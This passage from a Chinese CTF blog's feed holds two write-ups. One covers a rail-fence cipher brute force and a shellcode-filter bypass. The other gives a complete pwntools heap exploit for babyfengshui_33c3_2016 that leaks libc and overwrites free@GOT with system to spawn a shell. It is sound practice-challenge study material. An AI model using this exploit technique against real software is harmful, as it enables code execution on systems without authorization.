class="params">str1,str2</span>):</span></span><br><span class="line">    ans=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">if</span>(str1[i]==str2[i]):ans+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">Rail=<span class="number">13</span></span><br><span class="line">Offset=<span class="number">5</span></span><br><span class="line">m=<span class="string">&#x27;flag&#123;_________________________________________________________&#125;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for Rail in range(2,20):</span></span><br><span class="line"><span class="string">    for Offset in range(0,30):</span></span><br><span class="line"><span class="string">        if encrypt(m, Rail , Offset)[23:25]==&#x27;&#125;l&#x27;:</span></span><br><span class="line"><span class="string">        print(Rail,Offset)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">63</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        m=m[:i]+<span class="built_in">chr</span>(j)+m[i+<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> compare(target,encrypt(m, Rail , Offset))==i+<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br></pre></td></tr></table></figure><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/1.png" alt="1"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;</span><br></pre></td></tr></table></figure><p>再放工具md5即可。</p><p>可能是固定的算法思维吧，就只想到这个，忘了有工具这种东西了。参数解出来放在CyberChef中可以直接一把梭。</p><h3 id="pwn-sx"><a href="#pwn-sx" class="headerlink" title="pwn-sx"></a>pwn-sx</h3><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/2.png" alt="2"></p><p>分析文件是一道shellcode 题目，然后输入的shellcode经过传参到这个函数来判断是否合法，我以为都要满足，然后小算了一下发现限制很多，分组限制，当时我挺绝望的，想着这谁能做啊。可是结束之后我才想到可以\0字节绕过判断后面直接跟上shellcode ，只要保证前面能正确执行指令满足那些条件就可以。这里需要用到CyberChef工具中的disassemble，可以直接根据字节码转出来汇编指令，只要执行不产生异常，不让它指令偏移那就都可以放上来。</p><p>小算一波，发现下标%3=0的字节只能在[0xc0-0xff]范围内，%3=1和%3=2的则在0x80-0xbf的范围内。那就一个个指令尝试过去，最后发现一个很合适的。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/3.png" alt="3"></p><p>执行完之后刚好能在最后一个00字节之后，后面填上shellcode直接打就结束了，下面附上本地运行结果。</p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/4.png" alt="4"></p><p><img src="/2021/10/23/zjctf2021%20%E9%A2%84%E8%B5%9B/5.png" alt="5"></p><p>经过本次比赛，也意识到自己的不足应该是这些基础知识，算法优势应当好好利用起来去破密码试试看。总之，初赛过去，就得看向决赛了，争取在决赛上能一鸣惊人，加油！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;作者因为之前电脑丢了导致中间两个月断更，最近会把之前的很多都补回来。言归正传，这次比赛总体来说不太理想，没有达到预期。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
  </entry>
  
  <entry>
    <title>babyfengshui_33c3_2016 writeup</title>
    <link href="http://example.com/2021/08/15/babyfengshui_33c3_2016%20writeup/"/>
    <id>http://example.com/2021/08/15/babyfengshui_33c3_2016%20writeup/</id>
    <published>2021-08-15T02:00:00.000Z</published>
    <updated>2021-11-11T13:03:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的<a href="https://buuoj.cn/challenges#babyfengshui_33c3_2016">babyfengshui_33c3_2016</a></p><span id="more"></span><h2 id="分析elf文件"><a href="#分析elf文件" class="headerlink" title="分析elf文件"></a>分析elf文件</h2><p>checksec一下发现canary保护和NX保护，got表没有保护，且随即地址没有开启。这就意味着got表可写，拖到IDA当中发现是一个经典的堆菜单题，以我现在的水平，那就是先分析它free后指针有无清零。本来一开始看它free了两个堆块，确指将一个指针清零了，以为是有uaf漏洞，但是后面发现不是这样的，它每一条目分一个name和对应的description，name且dscription是用指针指示，并且每个条目固定是80字节的大小，因此可以把一个条目看成一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">heap</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">0x7c</span>];</span><br><span class="line">    <span class="keyword">char</span> *description;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以，我把整个结构体free了之后就相当于把这个description的指针清零了，因此本题不存在uaf漏洞。再观察添加一个项目的函数，发现name是固定长度输入，且用了fgets函数限定输入0x7c字节，整个name那就是不可能溢出了，就连off by null漏洞都不存在。那么这样的话只能看看edit函数了，edit函数它在之前if也会有一个长度输入，并且用了下面这一句if判断，如果为真就直接退出系统</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">char</span> *)(v3 + *(_DWORD *)*(&amp;ptr + a1)) &gt;= (<span class="keyword">char</span> *)*(&amp;ptr + a1) - <span class="number">4</span> )</span><br></pre></td></tr></table></figure><p>它这个是什么意思呢，翻译成c语言大概就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">heap *item</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">(item-&gt;description+length&gt;=item<span class="number">-4</span>)</span></span>&#123;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它们的地址之差小于输入的长度，那就退出，如果长度溢出到那个结构体堆块的metadata，那就退出。</p><p>看似这个也不能溢出，但是实际上这个能用一个方法绕过。因为如果我们直接分配堆块的话，它们物理地址是相邻的，但是如果它们不物理相邻，中间隔了一个堆块，那就可以任意溢出中间的堆块了。并且got表可写，我们是通过指针找到description的，如果把它溢出改成got表的地址，那么在edit的时候就可以修改got表的条目了。那么我们修改哪个？把free改成system，那么在free(item-&gt;description)的时候就会变成system(item-&gt;description)，如果把item-&gt;description的内容改成”/bin/sh”，那么就可以愉快的getshell了。</p><p>这便是分析elf文件得到的信息。</p><h2 id="编写脚本"><a href="#编写脚本" class="headerlink" title="编写脚本"></a>编写脚本</h2><p>先构造交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br></pre></td></tr></table></figure><p>这里需要特别注意add函数，它有两个长度输入，一个是description的堆块大小，一个是description内容的长度大小。这个name其实没必要弄，因为利用不到，但是我还是弄了。</p><p>首先添加两个0x80大小description的堆块，这样得到了两个0x80和0x88的大堆块。free掉第一个堆块，因为都不属于fastbin范围的堆块，那么就会合并成0x108大小的堆块，那么接下来如果我再申请一个0x100大小的description就会得到这个free的堆块，那么就可以在这个堆块上溢出第二个堆块了。</p><p>下面是我的完整exp</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x:p=process(file_name)</span><br><span class="line">    <span class="keyword">else</span>:p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">    <span class="keyword">return</span> ELF(file_name),p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,size,k,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;description: &#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(k).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,payload</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;length: &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;text: &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">elf,p=conn(<span class="number">0</span>,<span class="string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#add(b&#x27;a&#x27;,0x80,0x80,b&#x27;a&#x27;*0x10)</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh\0&#x27;</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="string">b&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>,<span class="number">0x100</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x10c</span>*<span class="string">b&#x27;b&#x27;</span>+p64(<span class="number">0x89</span>)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x80</span>+p32(<span class="number">0x81</span>)+p32(free_got))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr=u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">success(<span class="string">&#x27;free_addr&#x27;</span>+<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_addr=free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;好久没有更新博客了，因为作者太懒了，又懒又菜，今天来康康这道题，buuoj的&lt;a href=&quot;https://buuoj.cn/challenges#babyfengshui_33c3_2016&quot;&gt;babyfengshui_33c3_2016&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
</feed>
